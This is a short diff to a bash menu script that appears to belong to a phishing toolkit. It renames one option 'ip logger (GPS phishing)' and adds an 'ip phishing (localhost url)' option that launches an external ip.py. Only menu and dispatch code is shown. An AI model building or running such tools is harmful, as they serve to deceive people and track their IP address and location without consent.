@@ -1,4 +1,3 @@
-
 red='\033[1;31m'
 
 rset='\033[0m'
@@ -37,9 +36,11 @@ menu() {
 
             
 
-           (3) ip phishing
+           (3) ip logger (GPS phishing)
 
             
+	   (4) ip phishing (localhost url)
+
 
            (0) exit
 
@@ -58,6 +59,9 @@ useripaddr
 elif [ $ip = 3 ]; then
 
 iplogger
+elif [ $ip = 4 ]; then
+
+ip_phishing
 
 elif [ $ip = 0 ]; then
 
@@ -363,6 +367,10 @@ fi
 
 }
 
+ip_phishing() {
+
+bash ip.py
+}
 banner
 
 menu
